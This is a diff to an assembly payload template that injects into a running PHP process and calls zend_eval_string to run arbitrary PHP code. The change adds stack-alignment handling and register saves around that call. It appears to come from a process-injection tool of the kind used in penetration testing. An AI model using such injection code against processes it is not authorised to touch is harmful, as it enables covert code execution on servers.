@@ -27,10 +27,22 @@ execute_php_code_main:
 	
 	// BEGIN: call zend_eval_string("arbitrary PHP code here")
 	push r10
+	push r8
 	push rdx
 	//even though rbx is not used here, if the push/pop for it isn't present, the target process will segfault on my system
 	push rbx
 	push rax
+	
+	// ensure the stack is 16-byte aligned
+	mov r8, rsp
+	and r8, 0x8
+	cmp r8, 0x8
+	je execute_php_code_call_inner
+	push r8
+
+execute_php_code_call_inner:
+	push r8
+	
 	// arbitrary name
 	mov rax, arbitrary_read_write_data_address[rip]
 	mov rdx, rax
@@ -41,9 +53,19 @@ execute_php_code_main:
 	mov rdi, rax
 	mov r10, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
 	call r10
+	
+	pop r8
+	
+	// remove extra value from the stack if one was added to align it
+	cmp r8, 0x8
+	je execute_php_code_cleanup
+	pop r8
+
+execute_php_code_cleanup:
 	pop rax
 	pop rbx
 	pop rdx
+	pop r8
 	pop r10
 	// END: call zend_eval_string("arbitrary PHP code here")
 
